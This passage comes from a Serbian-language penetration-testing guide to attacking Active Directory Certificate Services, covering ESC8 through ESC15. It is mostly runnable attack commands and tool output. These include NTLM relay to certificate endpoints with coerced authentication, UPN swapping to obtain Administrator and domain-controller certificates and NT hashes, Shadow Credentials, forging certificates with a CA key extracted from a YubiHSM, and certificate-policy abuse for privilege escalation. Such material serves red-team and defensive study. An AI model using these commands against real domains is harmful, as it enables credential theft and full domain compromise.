   *Ako predložak već ne definiše proširenje *Certificate Issuance Policies*, gornja vrednost će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga ima i prava odobravanja *Manage Certificates*) ili sačekajte da ga operater odobri. Kada bude izdat, preuzmite sertifikat:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Rezultujući sertifikat sada sadrži zlonamerni OID za politiku izdavanja i može se koristiti u narednim napadima (npr. ESC13, eskalacija domena itd.).

> NAPOMENA: Isti napad može da se izvrši pomoću Certipy ≥ 4.7 preko komande `ca` i parametra `-set-extension`.

## NTLM Relay ka HTTP krajnjim tačkama AD CS-a – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je **instaliran AD CS**, ako postoji **ranjiva veb krajnja tačka za upis** i objavljen je bar jedan **šablon sertifikata** koji dozvoljava **upis računara u domenu i client authentication** (kao što je podrazumevani šablon **`Machine`**), napadač može da kompromituje **bilo koji računar na kom je aktivna usluga spooler**!

AD CS podržava nekoliko **metoda upisa zasnovanih na HTTP-u**, koje su dostupne preko dodatnih serverskih uloga koje administratori mogu da instaliraju. Ovi interfejsi za upis sertifikata zasnovan na HTTP-u podložni su **NTLM relay napadima**. Napadač može sa **kompromitovane mašine da se predstavlja kao bilo koji AD nalog koji se autentifikuje preko dolaznog NTLM-a**. Dok se predstavlja kao nalog žrtve, napadač može da pristupi ovim veb interfejsima i **zatraži sertifikat za client authentication koristeći šablon sertifikata `User` ili `Machine`**.

- **Veb interfejs za upis** (starija ASP aplikacija dostupna na adresi `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, koji ne pruža zaštitu od NTLM relay napada. Pored toga, preko svog HTTP Authorization zaglavlja izričito dozvoljava samo NTLM autentifikaciju, zbog čega bezbedniji metodi autentifikacije, kao što je Kerberos, ne mogu da se koriste.
- Veb servis **Certificate Enrollment Service** (CES), veb servis **Certificate Enrollment Policy** (CEP) i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate autentifikaciju preko HTTP Authorization zaglavlja. Negotiate autentifikacija **podržava i** Kerberos i **NTLM**, pa napadač tokom relay napada može da **spusti autentifikaciju na NTLM**. Iako ovi veb сервиси подразумевано омогућавају HTTPS, сам HTTPS **не штити од NTLM relay напада**. HTTPS сервиси могу да се заштите од NTLM relay напада само ако се HTTPS комбинује са channel binding-ом. Нажалост, AD CS не активира Extended Protection for Authentication у IIS-у, што је неопходно за channel binding.<sup>[[6]](#references)</sup>

Чест **проблем** код NTLM relay напада је **кратко трајање NTLM сесија** и немогућност нападача да комуницира са сервисима који **захтевају NTLM signing**.

Ипак, ово ограничење може да се превазиђе искоришћавањем NTLM relay напада за добијање сертификата за корисника, јер трајање сесије одређује период важења сертификата, а сертификат може да се користи са сервисима који **захтевају NTLM signing**. Упутства за коришћење украденог сертификата потражите овде:


{{#ref}}
account-persistence.md
{{#endref}}

Још једно ограничење NTLM relay напада је то што **налог жртве мора да се аутентификује на машини коју контролише нападач**. Нападач може или да сачека или да покуша да **присили** ову аутентификацију:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Злоупотреба**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` набраја **омогућене HTTP крајње тачке AD CS-а**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CA) za čuvanje krajnjih tačaka Certificate Enrollment Service (CES). Ove krajnje tačke mogu se parsirati i izlistati pomoću alata **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Zloupotreba pomoću [Certipy](https://github.com/ly4k/Certipy)

Certipy podrazumevano šalje zahtev za sertifikat na osnovu šablona `Machine` ili `User`, u zavisnosti od toga da li se ime naloga čija se autentifikacija prosleđuje završava znakom `$`. Alternativni šablon može se navesti pomoću parametra `-template`.

Zatim se može upotrebiti tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) za iznuđivanje autentifikacije. Kada je reč o kontrolerima domena, neophodno je navesti `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, poznata kao ESC9, izostavlja SID ekstenziju `szOID_NTDS_CA_SECURITY_EXT` iz sertifikata. Stariji primeri ESC9 oslanjaju se na ponašanje kompatibilnosti KDC-a (`StrongCertificateBindingEnforcement=1`) ili na zaseban način mapiranja preko slabo konfigurisanog Schannel-a. Vrednost `1` je **istorijska postavka kompatibilnosti**, a ne podrazumevana trenutna vrednost: Microsoft navodi da je podrška za KDC override prestala ažuriranjem za bezbednost Windows-a od 9. septembra 2025. Proverite stvarno ažuriranje ciljnog sistema i krajnju tačku za autentifikaciju pre nego što primenite stariji postupak.<sup>[[7]](#references)</sup> Pogledajte [Microsoft-ove smernice za uvođenje](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Uslovi pod kojima postavka ove zastavice postaje značajna uključuju:

- Na starijem, kompatibilnom KDC-u, efektivna politika vezivanja sertifikata dozvoljava mapiranje; alternativno, krajnja tačka Schannel-a zasebno omogućava UPN mapiranje putem bita `0x4` za `CertificateMappingMethods`.
- Sertifikat je označen zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u okviru postavke `msPKI-Enrollment-Flag`.
- Sertifikat navodi EKU za autentifikaciju klijenta.
- Dostupne su `GenericWrite` dozvole nad bilo kojim nalogom kako bi se kompromitovao drugi nalog.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad `Jane@corp.local`, sa ciljem da kompromituje `Administrator@corp.local`. Šablon sertifikata `ESC9`, u koji `Jane@corp.local` ima dozvolu da se upiše, konfigurisan je sa zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u postavci `msPKI-Enrollment-Flag`.

U početku se pribavlja hash naloga `Jane` pomoću Shadow Credentials, zahvaljujući `GenericWrite` dozvolama koje ima `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Nakon toga, `userPrincipalName` korisnice `Jane` menja se u `Administrator`, namerno izostavljajući deo sa domenom `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ova izmena ne krši ograničenja, s obzirom na to da `Administrator@corp.local` ostaje različit od vrednosti `userPrincipalName` za `Administrator`.

Nakon toga, zahtev za šablon sertifikata `ESC9`, označen kao ranjiv, podnosi se kao `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Primećeno je da `userPrincipalName` sertifikata odražava `Administrator`, bez ikakvog „object SID“.

`userPrincipalName` korisnice `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Pokušaj autentifikacije pomoću izdatog sertifikata sada daje NT hash za `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` jer sertifikat ne navodi domen:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

U okviru ESC10 često se razmatraju dve zasebne smernice za mapiranje sertifikata. Pročitajte podešavanje na krajnjoj tački koja zaista obrađuje relevantnu autentifikaciju:

- Schannel `CertificateMappingMethods` u okviru `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` kontroliše mapiranje klijentskih sertifikata za TLS na serveru aplikacije. UPN bit je `0x4`; podrazumevana vrednost na ažuriranim sistemima je `0x18` (`0x8 | 0x10`).
- KDC `StrongCertificateBindingEnforcement` u okviru `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` istorijski je kontrolisao kompatibilnost vezivanja Kerberos sertifikata. Vrednost `1` nije pouzdana podrazumevana vrednost za aktuelne sisteme, a Microsoft je ukinuo podršku za ovo nadjačavanje bezbednosnim ažuriranjem za Windows od 9. septembra 2025. Njegovo stanje samo po sebi ne opisuje Schannel UPN mapiranje.<sup>[[7]](#references)</sup>

**Slučaj 1**

Istorijski, kada je stariji KDC poštovao `StrongCertificateBindingEnforcement=0`; proverite nivo ažuriranja, jer ovo nadjačavanje više nije podržano na aktuelnim, ažuriranim sistemima.

**Slučaj 2**

Kada je na krajnjoj tački Schannel za klijentske sertifikate omogućen UPN bit (`0x4`) za `CertificateMappingMethods`. Ovo je zasebno podešavanje, odvojeno od KDC strong-binding enforcementa, i i dalje zahteva sertifikat za klijentsku autentifikaciju za koji se može upisati, kao i efektivnu kontrolu nad atributom mapiranog naloga.

### Slučaj zloupotrebe 1

U starijoj implementaciji u kojoj KDC i dalje poštuje `StrongCertificateBindingEnforcement=0`, kontrola nad atributom `userPrincipalName` naloga može biti deo putanje slabog mapiranja do drugog naloga. Potrebno je zasebno proveriti upisivanje potrebnog sertifikata, mapiranje, identitet cilja i uspešnu autentifikaciju; ACE `GenericWrite` ili vrednost registra sami po sebi ne dokazuju preuzimanje naloga.

Na primer, imajući dozvole `GenericWrite` nad `Jane@corp.local`, napadač nastoji da kompromituje `Administrator@corp.local`. Procedura je slična ESC9, što omogućava korišćenje bilo kog šablona sertifikata.

Najpre se hash naloga `Jane` pribavlja pomoću Shadow Credentials, uz iskorišćavanje dozvola `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Nakon toga, `userPrincipalName` od `Jane` menja se u `Administrator`, pri čemu se namerno izostavlja deo `@corp.local` da bi se izbeglo kršenje ograničenja.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Nakon toga se, kao `Jane`, zatraži sertifikat koji omogućava autentifikaciju klijenta, koristeći podrazumevani šablon `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` korisnice `Jane` zatim se vraća na svoju prvobitnu vrednost, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Autentifikacija pomoću pribavljenog sertifikata pružiće NT hash naloga `Administrator@corp.local`, zbog čega je potrebno navesti domen u komandi, jer sertifikat ne sadrži podatke o domenu.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži bit-flag `UPN` (`0x4`), nalog A sa dozvolama `GenericWrite` može da kompromituje bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući mašinske naloge i ugrađeni administrator domena `Administrator`.

Ovde je cilj da se kompromituje `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` pomoću Shadow Credentials, uz iskorišćavanje dozvole `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` za `Jane` se zatim postavlja na `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Zahteva se sertifikat za autentifikaciju klijenta kao `Jane`, koristeći podrazumevani predložak `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` korisnice `Jane` vraća se na prvobitnu vrednost nakon ovog procesa.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Za autentifikaciju putem Schannel-a koristi se Certipy opcija `-ldap-shell`, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Preko LDAP shell-a, komande kao što je `set_rbcd` omogućavaju napade Resource-Based Constrained Delegation (RBCD), što može dovesti do kompromitovanja kontrolera domena.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ova ranjivost se odnosi i na svaki korisnički nalog koji nema `userPrincipalName` ili čiji se `userPrincipalName` ne podudara sa `sAMAccountName`. Podrazumevani nalog `Administrator@corp.local` predstavlja glavnu metu zbog svojih povišenih LDAP privilegija i činjenice da po podrazumevanim podešavanjima nema `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa opcijom `IF_ENFORCEENCRYPTICERTREQUEST`, moguće je izvesti NTLM relay napade bez potpisivanja preko RPC servisa. [Referenca](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Možete koristiti `certipy` da proverite da li je `Enforce Encryption for Requests` isključen. `certipy` će prikazati ranjivosti `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scenario zloupotrebe

Potrebno je podesiti relay server:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Napomena: Za kontrolere domena, moramo da navedemo `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### Objašnjenje

Administratori mogu da podese Certificate Authority tako da se čuva na eksternom uređaju kao što je „Yubico YubiHSM2“.

Ako je USB uređaj povezan sa CA serverom preko USB porta ili sa USB serverom ako je CA server virtuelna mašina, za Key Storage Provider je potreban ključ za autentifikaciju (ponekad se naziva „lozinka“) kako bi generisao i koristio ključeve na YubiHSM uređaju.

Ovaj ključ/lozinka čuva se u registru u čistom tekstu, pod ključem `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Referenca je [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario zloupotrebe

Ako je privatni ključ CA-ja sačuvan na fizičkom USB uređaju, moguće ga je oporaviti kada dobijete shell access.

Najpre morate da pribavite sertifikat CA-ja (javan je), a zatim:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Konačno, upotrebite komandu `certutil -sign` da biste falsifikovali novi proizvoljni sertifikat pomoću CA sertifikata i njegovog privatnog ključa.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u predložak sertifikata. Objekti `msPKI-Enterprise-Oid`, koji su zaduženi za izdavanje politika, mogu se pronaći u Configuration Naming Context-u (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika se može povezati sa AD grupom pomoću atributa `msDS-OIDToGroupLink` ovog objekta, čime sistem može da autorizuje korisnika koji predoči sertifikat kao da je član te grupe. [Referenca ovde](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Drugim rečima, kada korisnik ima dozvolu da se upiše za sertifikat, a sertifikat je povezan sa OID grupom, korisnik može da nasledi privilegije te grupe.

Upotrebite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da biste pronašli OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scenario zloupotrebe

Pronađite korisnika koji ima dozvolu za upis u predložak pomoću komande `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu za upis u `VulnerableTemplate`, korisnik može da nasledi privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede predložak i dobiće sertifikat sa pravima `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Zloupotreba eksplicitnog mapiranja sertifikata — ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[14]](#references)</sup>

ESC14 se bavi ranjivostima koje nastaju zbog „slabog eksplicitnog mapiranja sertifikata“, prvenstveno usled zloupotrebe ili nebezbedne konfiguracije atributa `altSecurityIdentities` na korisničkim ili računarskim nalozima Active Directory-ja. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhe autentifikacije. Kada su popunjena, ova eksplicitna mapiranja mogu da nadjačaju podrazumevanu logiku mapiranja sertifikata, koja se obično oslanja na UPN-ove ili DNS imena u SAN-u sertifikata, odnosno na SID ugrađen u bezbednosno proširenje `szOID_NTDS_CA_SECURITY_EXT`.

„Slabo“ mapiranje nastaje kada je vrednost niske koja se koristi u atributu `altSecurityIdentities` za identifikaciju sertifikata previše opšta, lako se pogađa, oslanja se na nejedinstvena polja sertifikata ili koristi komponente sertifikata koje se lako mogu lažirati. Ako napadač može da pribavi ili napravi sertifikat čiji se atributi poklapaju sa tako definisanim slabim eksplicitnim mapiranjem privilegovanog naloga, može da koristi taj sertifikat za autentifikaciju kao taj nalog i njegovo lažno predstavljanje.

Primeri potencijalno slabih niskih mapiranja `altSecurityIdentities` uključuju:

- Mapiranje samo prema uobičajenom Subject Common Name (CN): npr. `X509:<S>CN=SomeUser`. Napadač bi mogao da pribavi sertifikat sa ovim CN-om iz manje bezbednog izvora.
- Korišćenje previše generičkih Issuer Distinguished Name (DN) vrednosti ili Subject DN vrednosti bez dodatnog određivanja, kao što su konkretni serijski broj ili identifikator ključa subjekta: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidljivih obrazaca ili nekriptografskih identifikatora koje napadač može da obezbedi u sertifikatu koji može legitimno da pribavi ili falsifikuje (ako je kompromitovao CA ili pronašao ranjiv šablon kao u ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira prema punim Issuer i Subject DN vrednostima)
- `X509:<SKI>SubjectKeyIdentifier` (mapira prema vrednosti proširenja Subject Key Identifier sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira prema serijskom broju, koji se implicitno određuje pomoću Issuer DN-a) - ovo nije standardni format; obično je to `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira prema RFC822 imenu, obično imejl adresi, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira prema SHA1 hešu sirovog javnog ključa sertifikata - uglavnom je snažno)

Bezbednost ovih mapiranja zavisi od identifikatora u mapiranju. Microsoft klasifikuje mapiranja zasnovana na imejlu ili imenima subjekta, uključujući `X509:<RFC822>`, kao **slaba**. U režimu Full Enforcement odbacuje se sertifikat bez snažnog mapiranja; bezbednosna ispravka za Windows iz septembra 2025. uklonila je mogućnost vraćanja na režim Compatibility. Zato samo slabo mapiranje nije pouzdan trenutni put za lažno predstavljanje. Pre procene scenarija slabog mapiranja proverite stvarni nivo zakrpa kontrolera domena i ponašanje mapiranja sertifikata. Pristup za pisanje atributa `altSecurityIdentities` predstavlja zaseban trag: napadač sa odgovarajućim pouzdanim sertifikatom možda može da doda **snažno** eksplicitno mapiranje, u zavisnosti od efektivnih dozvola i validacije sertifikata. Pogledajte [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) i [istraživanje ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Potrebno je dijagnostikovati i neuspehe autentifikacije sertifikatom: onemogućen ciljni nalog ili istekla lozinka mogu da spreče prijavu čak i kada je sam sertifikat i dalje važeći.

### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory-ju (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut postavljen (namerno ili usled pogrešne konfiguracije), napadači mogu da se lažno predstavljaju kao nalozi tako što će predočiti sertifikate koji odgovaraju mapiranju.

#### Scenario A: Napadač može da piše u `altSecurityIdentities`

 **Preduslov**: Napadač ima dozvolu za pisanje u atribut `altSecurityIdentities` ciljnog naloga ili dozvolu da je dodeli u obliku jedne od sledećih dozvola na ciljnom AD objektu:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scenario B: Cilj ima slabo mapiranje X509RFC822 (imejl)

- **Istorijski/uslovni preduslov**: Cilj ima slabo mapiranje X509RFC822 u atributu `altSecurityIdentities`, napadač može da izmeni atribut `mail` podnosioca zahteva, a odgovarajući šablon uključuje tu imejl adresu u sertifikat za klijentsku autentifikaciju bez konfliktne SID veze. Za autentifikaciju je neophodno i okruženje koje još uvek prihvata slabo mapiranje; Full Enforcement odbacuje sertifikate koji imaju samo slabo mapiranje. Samo mogućnost pisanja u atribut `mail` predstavlja tek trag.
#### Scenario C: Cilj ima mapiranje X509IssuerSubject

- **Preduslov**: Cilj ima slabo eksplicitno mapiranje X509IssuerSubject u atributu `altSecurityIdentities`. Napadač može da podesi atribut `cn` ili `dNSHostName` na principal-u žrtve tako da odgovara subjektu mapiranja X509IssuerSubject cilja. Zatim napadač može da zatraži sertifikat kao žrtva i da ga iskoristi za autentifikaciju kao cilj.
#### Scenario D: Cilj ima mapiranje X509SubjectOnly

- **Preduslov**: Cilj ima slabo eksplicitno mapiranje X509SubjectOnly u atributu `altSecurityIdentities`. Napadač može da podesi atribut `cn` ili `dNSHostName` na principal-u žrtve tako da odgovara subjektu mapiranja X509SubjectOnly cilja. Zatim napadač može da zatraži sertifikat kao žrtva i da ga iskoristi za autentifikaciju kao cilj.
### konkretne operacije
#### Scenario A

Zatražite sertifikat šablona sertifikata `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Sačuvajte i konvertujte sertifikat

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Autentifikacija (pomoću sertifikata)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Čišćenje (opciono)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Za konkretnije metode napada u različitim scenarijima napada pogledajte: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

[Originalno istraživanje o ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) objašnjava kako application policies navedene u zahtevu za V1 template mogu da zamene konfigurisani Extended Key Usage na **nezakrpljenom issuing CA-u**.<sup>[[15]](#references)</sup> Kandidatu je potreban i objavljeni template u koji može da se izvrši enrollment, a koji dozvoljava potrebna svojstva subjekta/zahteva i nema prepreke u vidu odobrenja ili potpisa. Sama prava za enrollment ne dokazuju da je eksploatacija moguća. Upotreba Certificate Request Agent-a može dodatno zavisiti od odgovarajućeg drugog template-a i ograničenja enrollment agent-a; pre nego što ustvrdite da je taj put moguć, proverite stanje zakrpa za CA i rezultat izdavanja.

### Zloupotreba

[Dokumentacija za eskalaciju privilegija u Certipy-ju](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) sadrži detaljnije primere upotrebe.<sup>[[14]](#references)</sup>


Certipy-jeva komanda `find` može pomoći u identifikovanju V1 template-a koji su potencijalno podložni ESC15 ako CA nije zakrpljen.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Direct Impersonation via Schannel

**Korak 1: Zatražite sertifikat, ubacujući Application Policy „Client Authentication“ i UPN ciljnog korisnika.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći V1 šablon „WebServer“ (koji dozvoljava subject koji dostavlja upisani korisnik).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Ranljivi V1 template sa opcijom "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u ekstenziju Application Policies CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN za impersonaciju.

**Korak 2: Autentifikujte se putem Schannel-a (LDAPS) koristeći dobijeni sertifikat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: PKINIT/Kerberos Impersonation kroz zloupotrebu Enrollment Agent-a

**Korak 1: Zatražite sertifikat iz V1 šablona (sa opcijom "Enrollee supplies subject"), uz ubacivanje Application Policy „Certificate Request Agent“.** Ovaj sertifikat je namenjen napadaču (`attacker@corp.local`) da bi postao Enrollment Agent. Ovde se ne navodi UPN za identitet samog napadača, jer je cilj da dobije mogućnost delovanja kao agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Koristite „agent” sertifikat da zatražite sertifikat u ime ciljnog privilegovanog korisnika.** Ovo je korak nalik ESC3, koji koristi sertifikat iz Koraka 1 kao agent sertifikat.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
